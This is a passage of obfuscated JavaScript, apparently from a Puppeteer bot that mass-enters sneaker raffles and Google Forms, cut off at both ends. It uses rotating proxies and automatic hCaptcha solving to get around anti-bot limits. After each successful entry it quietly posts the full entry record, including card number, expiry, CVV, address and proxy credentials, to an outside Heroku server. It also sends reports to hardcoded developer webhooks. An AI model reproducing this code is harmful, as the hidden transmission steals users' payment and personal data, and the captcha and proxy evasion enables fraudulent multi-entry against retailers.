                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x28a9d8['name'] + ']\x20Task\x20' + (_0x49668a + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x3f2a38 = await _0x356bfb['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x2c5dca = Math['round'](Math['random']() * (_0x3f2a38['length'] - 0x1));
                            await _0x3f2a38[_0x2c5dca]['click']();
                        }
                        await _0x415e3e(0x4b0);
                        const _0xe6e8b2 = await _0x356bfb['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0xe6e8b2[0x0]['click'](), await _0x356bfb['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x5b438b() + '\x20[' + _0x28a9d8['name'] + ']\x20Task\x20' + (_0x49668a + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x356bfb['type']('input[name=\x22email\x22]', '' + _0x30d392[_0x49668a]['Email']), await _0x415e3e(0x640), await _0x356bfb['type']('input[name=\x22phone\x22]', '' + _0x30d392[_0x49668a]['Phone']), await _0x415e3e(0x4b0), await _0x356bfb['click']('button.btn.continue-button__1RtsS'), await _0x415e3e(0x4b0);
                        try {
                            await _0x356bfb['type']('input[name=\x22firstName\x22]', '' + _0x30d392[_0x49668a]['FirstName']), await _0x415e3e(0x258);
                        } catch {
                            const _0x7a11fb = await _0x356bfb['$$eval']('.invalid-feedback\x20>\x20div', _0x4eda73 => {
                                return _0x4eda73['map'](_0x31fcb3 => _0x31fcb3['innerText']);
                            });
                            console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x28a9d8['name'] + ']\x20Task\x20' + (_0x49668a + 0x1) + '\x20:\x20' + _0x7a11fb));
                            continue;
                        }
                        await _0x356bfb['type']('input[name=\x22lastName\x22]', '' + _0x30d392[_0x49668a]['LastName']), await _0x415e3e(0xc8), await _0x356bfb['type']('input[name=\x22instagramUsername\x22]', '' + _0x30d392[_0x49668a]['Follower']), await _0x415e3e(0x4b0), await _0x356bfb['click']('button.btn.continue-button__1RtsS'), await _0x415e3e(0x3e8), console['log'](_0x5b438b() + '\x20[' + _0x28a9d8['name'] + ']\x20Task\x20' + (_0x49668a + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x356bfb['select']('select[name=\x22country\x22]', '' + _0x30d392[_0x49668a]['Country']), await _0x415e3e(0x2bc), await _0x356bfb['type']('input[name=\x22streetName\x22]', '' + _0x30d392[_0x49668a]['Address1']), await _0x415e3e(0x258), await _0x356bfb['type']('input[name=\x22houseNumber\x22]', _0x30d392[_0x49668a]['HouseNumber'] + '\x20' + _0x30d392[_0x49668a]['Address2']), await _0x415e3e(0xc8), await _0x356bfb['type']('input[name=\x22postalCode\x22]', '' + _0x30d392[_0x49668a]['Zip']), await _0x415e3e(0x1f4), await _0x356bfb['type']('input[name=\x22city\x22]', '' + _0x30d392[_0x49668a]['City']), await _0x415e3e(0x4b0), await _0x356bfb['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x415e3e(0x4b0), await _0x356bfb['click']('button.btn.continue-button__1RtsS'), await _0x415e3e(0x4b0), console['log'](_0x5b438b() + '\x20[' + _0x28a9d8['name'] + ']\x20Task\x20' + (_0x49668a + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x356bfb['solveRecaptchas'](), console['log'](_0x5b438b() + '\x20[' + _0x28a9d8['name'] + ']\x20Task\x20' + (_0x49668a + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x415e3e(0xbb8), await _0x356bfb['click']('button.btn.continue-button__1RtsS'), await _0x415e3e(0x1388), console['log'](_0x5b438b() + '\x20[' + _0x28a9d8['name'] + ']\x20Task\x20' + (_0x49668a + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x356bfb['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x356bfb['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x415e3e(0x4b0), await _0x356bfb['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x30d392[_0x49668a]['CardNumber']), await _0x415e3e(0x320), await _0x356bfb['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x356bfb['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x30d392[_0x49668a]['ExpiryDate']), await _0x415e3e(0x4b0), await _0x356bfb['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x356bfb['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x30d392[_0x49668a]['CVV']), await _0x415e3e(0x226), await _0x356bfb['type']('input[name=\x22holderName\x22]', '' + _0x30d392[_0x49668a]['NameOnCard']), await _0x415e3e(0x226), await _0x356bfb['click']('button.adyen-checkout__button'), console['log'](_0x5b438b() + '\x20[' + _0x28a9d8['name'] + ']\x20Task\x20' + (_0x49668a + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x356bfb['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x415e3e(0xbb8);
                        } catch (_0x1fb070) {
                            console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x28a9d8['name'] + ']\x20Task\x20' + (_0x49668a + 0x1) + '\x20:\x203DS\x20Failed')), _0xef8dec = '3DS\x20Error\x20' + _0x1fb070;
                            var _0x105fd3 = await _0x105954(_0x30d392[_0x49668a], _0x28a9d8, 'dev', !![], _0xef8dec);
                            _0x46fd74['errorDEV'] = { 'embeds': [_0x105fd3] };
                            _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x46fd74['errorDEV']);
                            await _0x4d8e61(_0x369064, _0x46fd74['errorDEV']);
                            continue;
                        }
                        _0x53db49(_0x30d392[_0x49668a], _0x28a9d8), console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x28a9d8['name'] + ']\x20Task\x20' + (_0x49668a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x1824d9 = _0x30d392[_0x49668a];
                        try {
                            prxdata = {
                                'username': _0x5f9620['replace']('#', ''),
                                'module': _0x28a9d8['name'],
                                'entrydata': JSON['stringify'](_0x1824d9),
                                'proxy': '' + _0x2dc1af[_0x49668a]
                            };
                            var _0x3ba780 = JSON['stringify'](prxdata);
                            let _0x14b1ca = { 'headers': { 'content-type': 'application/json' } };
                            await _0x328de3['post']('https://jraffles.herokuapp.com/success', _0x3ba780, _0x14b1ca);
                        } catch (_0x58a7a7) {
                        }
                        if (_0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '')
                            try {
                                await _0x4d8e61(_0x165c4b['webhook'], _0x46fd74['succesDEVMSG']);
                            } catch {
                            }
                        await _0x415e3e(0xc8), await _0x4d8e61(_0xbd9f1e, _0x46fd74['succesDEVMSG']), await _0x415e3e(0xc8);
                        try {
                            await _0x4d8e61(_0x3ba9f8, _0x46fd74['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x5dec1f) {
                        console['log'](_0x5b438b() + '\x20[' + _0x28a9d8['name'] + ']\x20Task\x20' + (_0x49668a + 0x1) + '\x20:\x20' + _0x5dec1f), _0xef8dec = '' + _0x5dec1f;
                        var _0x105fd3 = await _0x105954(_0x30d392[_0x49668a], _0x28a9d8, 'dev', !![], _0xef8dec);
                        _0x46fd74['errorDEV'] = { 'embeds': [_0x105fd3] }, _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x46fd74['errorDEV']), await _0x4d8e61(_0x369064, _0x46fd74['errorDEV']), _0x106418 = 'yes';
                    } finally {
                        _0x3f28ca['close']();
                        if (_0x106418 == 'yes' && _0x23c0cd != 0x5) {
                            console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x28a9d8['name'] + ']\x20Task\x20' + (_0x49668a + 0x1) + '\x20:\x20Retrying\x20(' + _0x23c0cd + '\x20/\x205)')), _0x49668a = _0x49668a - 0x1, _0x23c0cd = _0x23c0cd + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'Google\x20Forms',
        'modules': [{
            'name': 'SMART\x20ENTRIES',
            'store': 'Google\x20Forms',
            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
            'function': async function (_0x210c4b, _0x24ebc5, _0x27a45a) {
                let _0x329558 = {
                    'FirstName': '',
                    'LastName': '',
                    'Email': '',
                    'Country': '',
                    'Address': '',
                    'City': '',
                    'Zip': '',
                    'Size': '',
                    'Phone': ''
                };
                var _0x46853e = _0xaf9669['readFileSync']('forms/templates.json', 'utf-8');
                let _0x22f894 = JSON['parse'](_0x46853e), _0x331bbd = ![];
                if (_0x22f894['length'] != 0x0) {
                    let _0x3d27ea = 0x0;
                    for (template of _0x22f894) {
                        if (template['Url'] == _0x24ebc5[0x0]['Url']) {
                            _0x331bbd = !![], console['log'](_0x5dc29b['yellow']('Would\x20you\x20like\x20to\x20use\x20this\x20template?'));
                            for (key in template) {
                                key != 'Url' && !key['includes']('Select') && !key['includes']('custom') && template[key] != '' && console['log'](template[key] + ':\x20' + _0x5dc29b['cyan'](key)), (key['includes']('Select') || key['includes']('custom')) && console['log'](template[key]['title'] + ':\x20' + _0x5dc29b['cyan'](template[key]['answer']));
                            }
                            console['log']();
                            async function _0x265f24() {
                                let _0x283b1f = await _0x160288['get']('answer');
                                if (_0x283b1f['answer']['toLowerCase']() != 'y' && _0x283b1f['answer']['toLowerCase']() != 'n')
                                    return console['log']('Invalid\x20Selection'), _0x265f24();
                                return _0x283b1f['answer']['toLowerCase']();
                            }
                            if (await _0x265f24() == 'n') {
                                _0x22f894['splice'](_0x3d27ea, 0x1), console['clear']();
                                break;
                            }
                            _0x329558 = template, console['clear']();
                            break;
                        }
                        _0x3d27ea++;
                    }
                }
                let _0x43eef6 = 0x0, _0x10701b = 0x0;
                function _0x2734ee(_0x1e6b64) {
                    console['log'](_0x5b438b() + '\x20[' + _0x210c4b['name'] + ']\x20Task\x20' + (_0x3ea4ee + 0x1) + '\x20:\x20' + _0x1e6b64);
                }
                var _0x257f95 = 0x0;
                for (key in _0x329558) {
                    if (key['includes']('custom'))
                        _0x43eef6++;
                    if (key['includes']('Select'))
                        _0x10701b++;
                }
                for (var _0x3ea4ee = 0x0; _0x3ea4ee < _0x24ebc5['length']; _0x3ea4ee++) {
                    _0x329558['Url'] = _0x24ebc5[_0x3ea4ee]['Url'];
                    let _0xc8e713 = ![];
                    if (_0x22f894['length'] != 0x0)
                        for (template of _0x22f894) {
                            if (template['Url'] == _0x24ebc5[_0x3ea4ee]['Url']) {
                                _0x329558 = template, _0xc8e713 = !![], _0x2734ee('Found\x20Template');
                                break;
                            }
                        }
                    var _0x22e64a;
                    if (_0x7f6d51 != 'yes') {
                        if (!_0x7f6d51)
                            var _0x7f6d51 = '';
                        else
                            _0x7f6d51 = '';
                        _0x257f95 = 0x0;
                    }
                    try {
                        await _0x3da21c(_0x24ebc5, _0x3ea4ee);
                    } catch {
                        _0x7f6d51 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x165c4b['useRandomProxy'] = ![])
                        var _0x44e0c5 = _0x27a45a[_0x3ea4ee]['split'](':');
                    else
                        var _0x17e6c6 = Math['round'](Math['random']() * (_0x27a45a['length'] - 0x1)), _0x44e0c5 = _0x27a45a[_0x17e6c6]['split'](':');
                    var _0x27112c;
                    if (_0x44e0c5['length'] == 0x1)
                        try {
                            _0x27112c = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x27112c = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    else
                        try {
                            _0x27112c = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x44e0c5[0x0] + ':' + _0x44e0c5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x27112c = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x44e0c5[0x0] + ':' + _0x44e0c5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    try {
                        let _0x50a0d2 = { 'first': ![] };
                        const _0x2c02c5 = await _0x27112c['newPage']();
                        if (_0x44e0c5['length'] != 0x0)
                            await _0x2c02c5['authenticate']({
                                'username': '' + _0x44e0c5[0x2],
                                'password': '' + _0x44e0c5[0x3]
                            });
                        _0x2734ee('Getting\x20Session');
                        let _0x210c2e = ![];
                        try {
                            await _0x2c02c5['goto'](_0x24ebc5[_0x3ea4ee]['Url'], {
                                'waitUntil': 'load',
                                'timeout': 0x0
                            }), await _0x415e3e(0xbb8);
                        } catch (_0x43e6b5) {
                            throw new Error(_0x43e6b5);
                        }
                        const _0x9abe83 = await _0x2c02c5['$']('body\x20>\x20div.llhEMd.iWO5td\x20>\x20div\x20>\x20div.g3VIld.Up8vH.J9Nfi.iWO5td\x20>\x20div.XfpsVe.J9fJmf');
                        if (_0x9abe83) {
                            _0x2734ee('Login\x20Detected');
                            let _0x574880 = await _0x9abe83['$']('div[data-id=\x22EBS5u\x22]');
                            await _0x574880['click'](), _0x210c2e = !![];
                        }
                        let _0x4f76e9 = await _0x2c02c5['$']('#identifierId');
                        _0x4f76e9 && (_0x210c2e = !![]);
                        await _0x2c02c5['waitForSelector']('.teQAzf');
                        async function _0x1de6d4() {
                            let _0x1746fb = await _0x2c02c5['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
                            for (question of _0x1746fb) {
                                let _0x234a14;
                                try {
                                    _0x234a14 = await question['$eval']('.M7eMe', _0x4fce1e => _0x4fce1e['textContent']);
                                } catch {
                                    continue;
                                }
                                if (_0x43eef6 != 0x0) {
                                    let _0x400040 = ![];
                                    for (let _0x627fb3 = 0x0; _0x627fb3 < _0x43eef6; _0x627fb3++) {
                                        if (_0x234a14 == _0x329558['custom' + _0x627fb3]['title']) {
                                            _0x2734ee('Custom\x20Selector\x20found;\x20' + _0x234a14);
                                            let _0x9f0b1a = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0xc0cd6f = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                            if (_0x9f0b1a)
                                                await _0x9f0b1a['type']('' + _0x329558['custom' + _0x627fb3]['answer']);
                                            else
                                                _0xc0cd6f && await _0xc0cd6f['type']('' + _0x329558['custom' + _0x627fb3]['answer']);
                                            _0x400040 = !![];
                                            break;
                                        }
                                    }
                                    if (_0x400040) {
                                        await _0x415e3e(0x15e);
                                        continue;
                                    }
                                }
                                if (_0x10701b != 0x0) {
                                    let _0x139b2d = ![];
                                    for (let _0x5bf1ff = 0x0; _0x5bf1ff < _0x10701b; _0x5bf1ff++) {
                                        if (_0x234a14 == _0x329558[_0x5bf1ff + 'Select']['title']) {
                                            _0x2734ee('Custom\x20Selector\x20found;\x20' + _0x234a14);
                                            let _0x569a96 = await question['$$']('.ulDsOb');
                                            for (opt of _0x329558[_0x5bf1ff + 'Select']['answer']) {
                                                let _0x380e97 = await _0x569a96[opt]['$']('span');
                                                await _0x380e97['click']();
                                            }
                                            _0x139b2d = !![];
                                            break;
                                        }
                                    }
                                    if (_0x139b2d) {
                                        await _0x415e3e(0x15e);
                                        continue;
                                    }
                                }
                                try {
                                    if (_0x234a14 == _0x329558['0Select']['title']) {
                                        _0x2734ee('Custom\x20Selector\x20found;\x20' + _0x329558['0Select']['title']);
                                        let _0x1f0639 = await question['$$']('.ulDsOb'), _0x527d21 = await _0x1f0639[_0x329558['0Select']['answer']];
                                        await _0x527d21['click']();
                                        continue;
                                    }
                                    if (_0x234a14 == _0x329558['1Select']['title']) {
                                        _0x2734ee('Custom\x20Selector\x20found;\x20' + _0x329558['1Select']['title']);
                                        let _0x329a8e = await question['$$']('.ulDsOb'), _0x983dbf = await _0x329a8e[_0x329558['1Select']['answer']];
                                        await _0x983dbf['click']();
                                        continue;
                                    }
                                    if (_0x234a14 == _0x329558['2Select']['title']) {
                                        _0x2734ee('Custom\x20Selector\x20found;\x20' + _0x329558['2Select']['title']);
                                        let _0x5873f6 = await question['$$']('.ulDsOb'), _0x190175 = await _0x5873f6[_0x329558['2Select']['answer']];
                                        await _0x190175['click']();
                                        continue;
                                    }
                                } catch (_0x2fc885) {
                                }
                                if (_0x234a14['toLowerCase']()['includes']('mail') && !_0x234a14['toLowerCase']()['includes']('agree') || _0x234a14 == _0x329558['Email']) {
                                    _0x2734ee('Mail\x20Selector\x20found;\x20' + _0x234a14);
                                    let _0x26a093 = await question['$']('input');
                                    !_0x26a093 && (_0x26a093 = await question['$']('textarea[jsname=\x22YPqjbf\x22]'));
                                    await _0x26a093['type'](_0x24ebc5[_0x3ea4ee]['Email']), await _0x415e3e(0x258);
                                    continue;
                                }
                                if (_0x234a14['toLowerCase']()['includes']('first') || _0x234a14['toLowerCase']() == 'name' || _0x234a14['toLowerCase']() == 'name\x20' || _0x234a14 == _0x329558['FirstName']) {
                                    _0x2734ee('FirstName\x20Selector\x20found;\x20' + _0x234a14);
                                    let _0xa40a85 = await question['$']('input');
                                    !_0xa40a85 && (_0xa40a85 = await question['$']('textarea'));
                                    await _0xa40a85['type'](_0x24ebc5[_0x3ea4ee]['FirstName'] + '\x20'), await _0x415e3e(0x258);
                                    if (_0x234a14 == _0x329558['FirstName'])
                                        continue;
                                }
                                if (_0x234a14['toLowerCase']()['includes']('last') || _0x234a14['toLowerCase']()['includes']('surname') || _0x234a14 == _0x329558['LastName']) {
                                    _0x2734ee('LastName\x20Selector\x20found;\x20' + _0x234a14);
                                    let _0x567917 = await question['$']('input');
                                    !_0x567917 && (_0x567917 = await question['$']('textarea'));
                                    await _0x567917['type'](_0x24ebc5[_0x3ea4ee]['LastName'] + '\x20'), await _0x415e3e(0x258);
                                    continue;
                                }
                                if (_0x234a14['toLowerCase']()['includes']('address') && !_0x234a14['toLowerCase']()['includes']('agree') || _0x234a14 == _0x329558['Address']) {
                                    _0x2734ee('Address\x20Selector\x20found;\x20' + _0x234a14);
                                    let _0x257d11 = await question['$']('input');
                                    !_0x257d11 && (_0x257d11 = await question['$']('textarea'));
                                    await _0x257d11['type'](_0x24ebc5[_0x3ea4ee]['Address1'] + '\x20' + _0x24ebc5[_0x3ea4ee]['HouseNumber'] + '\x20' + _0x24ebc5[_0x3ea4ee]['Address2']), await _0x415e3e(0x258);
                                    continue;
                                }
                                if (_0x234a14['toLowerCase']()['includes']('phone') || _0x234a14['toLowerCase']()['includes']('mobile') || _0x234a14 == _0x329558['Phone']) {
                                    _0x2734ee('Phone\x20Selector\x20found;\x20' + _0x234a14);
                                    let _0x107606 = await question['$']('input');
                                    !_0x107606 && (_0x107606 = await question['$']('textarea'));
                                    await _0x107606['type']('' + _0x24ebc5[_0x3ea4ee]['Phone']), await _0x415e3e(0x258);
                                    continue;
                                }
                                if (_0x234a14['toLowerCase']()['includes']('country') || _0x234a14 == _0x329558['Country']) {
                                    let _0x3fd777 = await question['$']('div[jsname=\x22wCJL8\x22]');
                                    if (_0x3fd777) {
                                        let _0x193e45 = ![], _0x49fe81 = await _0x3fd777['$$']('.ulDsOb');
                                        for (option of _0x49fe81) {
                                            let _0x29f206 = await option['$']('span'), _0x559157 = await option['$eval']('span', _0xd66e5a => _0xd66e5a['textContent']);
                                            if (_0x559157['toLowerCase']() == _0x24ebc5[_0x3ea4ee]['Country']['toLowerCase']()) {
                                                await _0x29f206['click'](), _0x193e45 = !![];
                                                break;
                                            }
                                        }
                                        if (!_0x193e45) {
                                            const _0x41a1c9 = await question['$']('.Hvn9fb.zHQkBf');
                                            await _0x41a1c9['click'](), await _0x41a1c9['type'](_0x24ebc5[_0x3ea4ee]['Country']);
                                        }
                                        continue;
                                    }
                                    _0x2734ee('Country\x20Selector\x20found;\x20' + _0x234a14);
                                    let _0x189f95 = await question['$']('input');
                                    !_0x189f95 && (_0x189f95 = await question['$']('textarea'));
                                    await _0x189f95['type']('' + _0x24ebc5[_0x3ea4ee]['Country']), await _0x415e3e(0x258);
                                    continue;
                                }
                                if (_0x234a14['toLowerCase']()['includes']('city') || _0x234a14 == _0x329558['City']) {
                                    _0x2734ee('City\x20Selector\x20found;\x20' + _0x234a14);
                                    let _0x2f675a = await question['$']('input');
                                    !_0x2f675a && (_0x2f675a = await question['$']('textarea'));
                                    await _0x2f675a['type']('' + _0x24ebc5[_0x3ea4ee]['City']), await _0x415e3e(0x258);
                                    continue;
                                }
                                if (_0x234a14['toLowerCase']()['includes']('zip') || _0x234a14 == _0x329558['Zip']) {
                                    _0x2734ee('Zip\x20Selector\x20found;\x20' + _0x234a14);
                                    let _0x60cd06 = await question['$']('input');
                                    !_0x60cd06 && (_0x60cd06 = await question['$']('textarea'));
                                    await _0x60cd06['type']('' + _0x24ebc5[_0x3ea4ee]['Zip']), await _0x415e3e(0x258);
                                    continue;
                                }
                                if (_0x234a14['toLowerCase']()['includes']('insta') || _0x234a14 == _0x329558['Follower']) {
                                    _0x2734ee('Follower\x20Selector\x20found;\x20' + _0x234a14);
                                    let _0x10e5b2 = await question['$']('input');
                                    !_0x10e5b2 && (_0x10e5b2 = await question['$']('textarea'));
                                    await _0x10e5b2['type']('' + _0x24ebc5[_0x3ea4ee]['Follower']), await _0x415e3e(0x258);
                                    continue;
                                }
                                if (_0x234a14['toLowerCase']()['includes']('size') || _0x234a14 == _0x329558['Size']) {
                                    _0x2734ee('Size\x20Selector\x20found;\x20' + _0x234a14);
                                    let _0x190c2f = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x190c2f) {
                                        let _0x27ca7d = await _0x190c2f['$$']('.ulDsOb');
                                        if (_0x24ebc5[_0x3ea4ee]['Size']['toLowerCase']() == 'random') {
                                            var _0x344a40 = Math['round'](Math['random']() * (_0x27ca7d['length'] - 0x1));
                                            await _0x27ca7d[_0x344a40]['click']();
                                        } else
                                            for (size of _0x27ca7d) {
                                                let _0x3b1ffb = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x2d4570 => _0x2d4570['textContent']);
                                                if (_0x3b1ffb['toLowerCase']()['includes'](_0x24ebc5[_0x3ea4ee]['Size'])) {
                                                    await size['click']();
                                                    break;
                                                }
                                            }
                                    }
                                    let _0x242fac = await question['$']('.ry3kXd');
                                    if (_0x242fac) {
                                        await _0x242fac['click'](), await _0x415e3e(0x9c4);
                                        let _0x53bade = await _0x2c02c5['$']('div[jsname=\x22V68bde\x22]'), _0x36b840 = await _0x53bade['$$']('div[jsname=\x22wQNmvb\x22]');
                                        for (size of _0x36b840) {
                                            let _0x4ad276 = await size['$eval']('.vRMGwf.oJeWuf', _0x48fdb5 => _0x48fdb5['textContent']), _0x41dfb8 = await size['$']('.vRMGwf.oJeWuf');
                                            if (_0x4ad276['toLowerCase']()['includes'](_0x24ebc5[_0x3ea4ee]['Size'])) {
                                                await _0x415e3e(0x190), await _0x41dfb8['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x415e3e(0x258);
                                    continue;
                                }
                                if (_0x234a14['toLowerCase']()['includes']('receive') || _0x234a14['toLowerCase']()['includes']('method')) {
                                    _0x2734ee('Method\x20Selector\x20found;\x20' + _0x234a14);
                                    let _0x914058 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x914058) {
                                        const _0x4025e3 = await _0x914058['$$']('.ulDsOb');
                                        for (size of _0x4025e3) {
                                            let _0x170e44 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x7f79cc => _0x7f79cc['textContent']);
                                            if (_0x170e44['toLowerCase']()['includes']('shipping')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x415e3e(0x258);
                                    continue;
                                }
                                if (_0x234a14['toLowerCase']()['includes']('offers') || _0x234a14['toLowerCase']()['includes']('agree')) {
                                    _0x2734ee('Authorization\x20Selector\x20found;\x20' + _0x234a14);
                                    const _0x23bced = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x23bced) {
                                        const _0x2a4760 = await _0x23bced['$$']('.ulDsOb');
                                        for (size of _0x2a4760) {
                                            let _0x324ae5 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x5be973 => _0x5be973['textContent']);
                                            if (_0x324ae5['toLowerCase']()['includes']('authorize') || _0x324ae5['toLowerCase']()['includes']('yes')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x415e3e(0x258);
                                    continue;
                                }
                                async function _0x437807() {
                                    let _0x1bf67f = await question['$']('.oyXaNc');
                                    if (_0x1bf67f) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x5dc29b['cyan'](_0x234a14) + '\x0a');
                                        let _0x5cb222 = await question['$$']('.ulDsOb');
                                        for (let _0x2eb8f4 = 0x0; _0x2eb8f4 < _0x5cb222['length']; _0x2eb8f4++) {
                                            let _0xf1e637 = await _0x5cb222[_0x2eb8f4]['$eval']('span', _0x98c2ce => _0x98c2ce['textContent']);
                                            console['log']('\x20(' + _0x2eb8f4 + ')\x20' + _0xf1e637);
                                        }
                                        console['log']();
                                        let _0x2da6e6 = await _0x160288['get']('option'), _0x566ff0 = await _0x5cb222[_0x2da6e6['option']]['$eval']('span', _0x50925a => _0x50925a['textContent']);
                                        _0x329558[_0x10701b + 'Select'] = {
                                            'title': _0x234a14,
                                            'answer': _0x2da6e6['option']['split'](',')
                                        };
                                        let _0x176e60 = await _0x5cb222[_0x2da6e6['option']]['$']('span');
                                        await _0x176e60['click'](), _0x10701b++;
                                        return;
                                    }
                                    let _0x5678b5 = await question['$']('.Y6Myld');
                                    if (_0x5678b5) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x5dc29b['cyan'](_0x234a14) + '\x0a');
                                        let _0x287fa9 = await question['$$']('.ulDsOb');
                                        for (let _0x2c410a = 0x0; _0x2c410a < _0x287fa9['length']; _0x2c410a++) {
                                            let _0x2ac126 = await _0x287fa9[_0x2c410a]['$eval']('span', _0x31deef => _0x31deef['textContent']);
                                            console['log']('\x20(' + _0x2c410a + ')\x20' + _0x2ac126);
                                        }
                                        console['log']();
                                        let _0x12cde7 = await _0x160288['get']('option');
                                        _0x329558[_0x10701b + 'Select'] = {
                                            'title': _0x234a14,
                                            'answer': _0x12cde7['option']['split'](',')
                                        };
                                        for (opt of _0x329558[_0x10701b + 'Select']['answer']) {
                                            let _0x1bfb19 = await _0x287fa9[opt]['$']('span');
                                            await _0x1bfb19['click']();
                                        }
                                        _0x10701b++;
                                        return;
                                    }
                                    var _0x14d240 = 0x0;
                                    let _0x49af7c = Object['keys'](_0x329558);
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x5dc29b['cyan'](_0x234a14) + '\x0a');
                                    for (data of _0x49af7c) {
                                        !data['includes']('custom' && !data['includes']('Select')) ? console['log']('\x20(' + _0x14d240 + ')\x20' + data + '\x20(Taken\x20from\x20csv)') : console['log']('\x20(' + _0x14d240 + ')\x20' + data), _0x14d240++;
                                    }
                                    console['log']('\x20(' + _0x49af7c['length'] + ')\x20Custom\x20input:'), console['log']();
                                    let _0x3cce09 = await _0x160288['get']('input');
                                    if (_0x3cce09['input'] == _0x49af7c['length']) {
                                        console['log']('What\x20should\x20the\x20bot\x20fill\x20in\x20this\x20input?\x0a');
                                        let _0x1d9fd3 = await _0x160288['get']('input');
                                        _0x329558['custom' + _0x43eef6] = {
                                            'title': _0x234a14,
                                            'answer': '' + _0x1d9fd3['input']
                                        };
                                        let _0x482187 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x38e51a = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                        if (_0x482187)
                                            await _0x482187['type']('' + _0x329558['custom' + _0x43eef6]['answer']);
                                        else
                                            _0x38e51a && await _0x38e51a['type']('' + _0x329558['custom' + _0x43eef6]['answer']);
                                        _0x43eef6++;
                                        return;
                                    }
                                    _0x329558['' + _0x49af7c[_0x3cce09['input']]] = _0x234a14;
                                    let _0x1967f8 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x83f1e5 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                    _0x1967f8 && await _0x1967f8['type']('' + _0x24ebc5[_0x3ea4ee]['' + _0x49af7c[_0x3cce09['input']]]), _0x83f1e5 && await _0x83f1e5['type']('' + _0x24ebc5[_0x3ea4ee]['' + _0x49af7c[_0x3cce09['input']]]), await _0x415e3e(0x258);
                                }
                                await _0x437807(), await _0x415e3e(0x37a);
                            }
                            let _0x9d044a = await _0x2c02c5['$']('div[jsname=\x22OCpkoe\x22]');
                            if (_0x9d044a)
